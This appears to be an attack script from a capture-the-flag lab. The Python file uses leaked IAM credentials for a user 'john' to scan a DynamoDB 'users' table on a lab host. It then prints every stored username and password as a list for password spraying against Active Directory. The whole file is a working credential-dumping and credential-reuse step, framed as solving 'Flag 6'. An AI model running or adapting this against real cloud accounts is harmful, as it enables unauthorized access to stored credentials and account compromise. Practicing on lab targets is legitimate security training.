#!/usr/bin/env python3
"""Dump DynamoDB users table (Flag 6) using john IAM creds from firmware/writeup."""
import json
import os
import subprocess
import sys

def _require_env(name: str) -> str:
    v = os.environ.get(name)
    if not v:
        sys.exit(f"Set {name}")
    return v


JOHN_KEY = _require_env("JOHN_AWS_KEY")
JOHN_SECRET = _require_env("JOHN_AWS_SECRET")
ENDPOINT = os.environ.get("AWS_ENDPOINT", "http://cloud.amzcorp.local")


def main() -> None:
    env = {
        **os.environ,
        "AWS_ACCESS_KEY_ID": JOHN_KEY,
        "AWS_SECRET_ACCESS_KEY": JOHN_SECRET,
        "AWS_DEFAULT_REGION": "us-east-1",
    }
    out = subprocess.check_output(
        [
            "aws",
            "--endpoint-url",
            ENDPOINT,
            "dynamodb",
            "scan",
            "--table-name",
            "users",
        ],
        env=env,
        text=True,
    )
    data = json.loads(out)
    print(json.dumps(data, indent=2))
    users = [(i["username"]["S"], i["password"]["S"]) for i in data.get("Items", [])]
    print("\n# AD spray list (username:password)")
    for u, p in users:
        print(f"{u}:{p}")


if __name__ == "__main__":
    main()
